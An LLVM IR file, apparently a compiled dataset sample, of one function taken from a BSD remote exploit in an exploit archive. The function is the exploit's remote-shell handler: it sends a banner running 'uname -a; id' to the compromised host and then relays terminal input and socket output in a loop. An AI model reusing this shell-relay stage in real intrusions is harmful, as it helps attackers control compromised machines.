; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_possibly_rooted.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_possibly_rooted.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.possibly_rooted.banner = private unnamed_addr constant [97 x i8] c"cd /; echo; uname -a; echo; id; echo; echo Welcome to the shell, enter commands at will; echo;\0A\0A\00", align 16
@stdin = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"Connection closed.\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @possibly_rooted(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [97 x i8], align 16
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %7 = bitcast [97 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %7, i8* align 16 getelementptr inbounds ([97 x i8], [97 x i8]* @__const.possibly_rooted.banner, i32 0, i32 0), i64 97, i1 false)
  %8 = load i32, i32* %2, align 4
  %9 = getelementptr inbounds [97 x i8], [97 x i8]* %3, i64 0, i64 0
  %10 = getelementptr inbounds [97 x i8], [97 x i8]* %3, i64 0, i64 0
  %11 = call i32 @strlen(i8* %10)
  %12 = call i32 @write(i32 %8, i8* %9, i32 %11)
  br label %13

13:                                               ; preds = %56, %1
  %14 = call i32 @FD_ZERO(i32* %5)
  %15 = load i32, i32* @stdin, align 4
  %16 = call i32 @fileno(i32 %15)
  %17 = call i32 @FD_SET(i32 %16, i32* %5)
  %18 = load i32, i32* %2, align 4
  %19 = call i32 @FD_SET(i32 %18, i32* %5)
  %20 = call i32 @select(i32 255, i32* %5, i32* null, i32* null, i32* null)
  %21 = load i32, i32* %2, align 4
  %22 = call i64 @FD_ISSET(i32 %21, i32* %5)
  %23 = icmp ne i64 %22, 0
  br i1 %23, label %24, label %39

24:                                               ; preds = %13
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %26 = call i32 @memset(i8* %25, i32 0, i32 1024)
  %27 = load i32, i32* %2, align 4
  %28 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %29 = call i32 @read(i32 %27, i8* %28, i32 1023)
  store i32 %29, i32* %6, align 4
  %30 = load i32, i32* %6, align 4
  %31 = icmp sle i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %24
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %34 = load i32, i32* @EXIT_SUCCESS, align 4
  %35 = call i32 @exit(i32 %34) #4
  unreachable

36:                                               ; preds = %24
  %37 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %37)
  br label %39

39:                                               ; preds = %36, %13
  %40 = load i32, i32* @stdin, align 4
  %41 = call i32 @fileno(i32 %40)
  %42 = call i64 @FD_ISSET(i32 %41, i32* %5)
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %56

44:                                               ; preds = %39
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %46 = call i32 @memset(i8* %45, i32 0, i32 1024)
  %47 = load i32, i32* @stdin, align 4
  %48 = call i32 @fileno(i32 %47)
  %49 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %50 = call i32 @read(i32 %48, i8* %49, i32 1023)
  %51 = load i32, i32* %2, align 4
  %52 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %54 = call i32 @strlen(i8* %53)
  %55 = call i32 @write(i32 %51, i8* %52, i32 %54)
  br label %56

56:                                               ; preds = %44, %39
  br label %13
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @fileno(i32) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
